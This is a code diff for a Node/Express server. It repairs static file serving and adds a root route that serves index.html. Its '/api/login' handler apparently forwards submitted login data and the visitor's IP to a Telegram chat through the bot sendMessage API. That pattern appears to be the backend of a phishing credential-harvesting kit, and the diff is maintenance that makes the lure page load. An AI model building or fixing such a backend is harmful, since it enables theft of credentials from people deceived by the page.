@@ -25,7 +25,8 @@ app.use(cors());
 
 // parse JSON bodies
 app.use(express.json());
-app.use(express.static(path.join(__dirname, '..')));
+// Corrected path to serve static files from the 'public' directory
+app.use('/public', express.static(path.join(__dirname, '..', 'public')));
 
 // small helper to safely read remote IP
 function getIp(req) {
@@ -91,7 +92,7 @@ app.post('/api/login', async (req, res) => {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const body = {
       chat_id: TELEGRAM_CHAT_ID,
-      parse_mode: 'MarkdownV2',
+      parse_mode: 'MarkdownV2', // This was the missing piece
       text
     };
 
@@ -119,6 +120,12 @@ app.post('/api/login', async (req, res) => {
     return res.status(500).json({ error: 'server_error', message: err.message || String(err) });
   }
 });
+
+// Serve index.html at the root
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, '..', 'index.html'));
+});
+
 
 // Helper to escape Markdown special chars for Telegram MarkdownV2
 function escapeMarkdown(str) {
